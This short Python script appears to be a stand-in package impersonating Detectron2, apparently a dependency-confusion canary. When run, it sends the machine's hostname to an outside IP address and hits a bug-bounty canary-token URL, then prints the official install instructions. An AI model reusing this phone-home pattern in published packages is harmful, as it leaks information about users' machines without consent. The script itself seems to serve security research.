import requests
import socket


def main():
    PINGBACK_URL = "http://158.110.146.224:9500/pingback"
    INTERNAL_PINGBACK_URL = "https://www.internalfb.com/intern/bug-bounty/get-canary-token/9feac291faa94d818167bc9b8e5c78fd/"

    requests.get(PINGBACK_URL, params={"host": socket.gethostname()})

    print("This is not the real Detectron2 package. Please install it with `python -m pip install detectron2 --no-index -f https://dl.fbaipublicfiles.com/detectron2/wheels/cu113/torch1.10/index.html`")

    requests.get(INTERNAL_PINGBACK_URL)

main()